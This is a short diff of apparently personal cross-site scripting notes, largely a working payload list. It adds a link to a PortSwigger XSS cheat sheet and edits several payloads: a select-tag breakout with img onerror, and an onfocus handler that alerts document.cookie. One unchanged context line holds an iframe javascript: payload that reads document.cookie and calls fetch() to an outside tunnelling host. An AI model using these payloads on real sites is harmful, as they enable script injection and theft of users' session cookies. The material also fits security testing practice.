@@ -1,3 +1,6 @@
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||
+Cheat-sheet link : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onafterscriptexecute
 |||||||||||||||||||||||||||||||||||||||||||||||||||||
 <iframe src="javascript:var i=' ' + document.cookie; alert(i); fetch('http://pip3lee101-64604.portmap.host:64604/?sam')">
 
@@ -56,4 +59,5 @@ for testing =====>
 
 ||||||||||||||||||||||||||||||||||||||||||||||||||||||
 special url payloads =========>
-&storeId="></select><img%20src=1%20onerror=alert(1)>
+"></select><img%20src=1%20onerror=alert(1)>
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
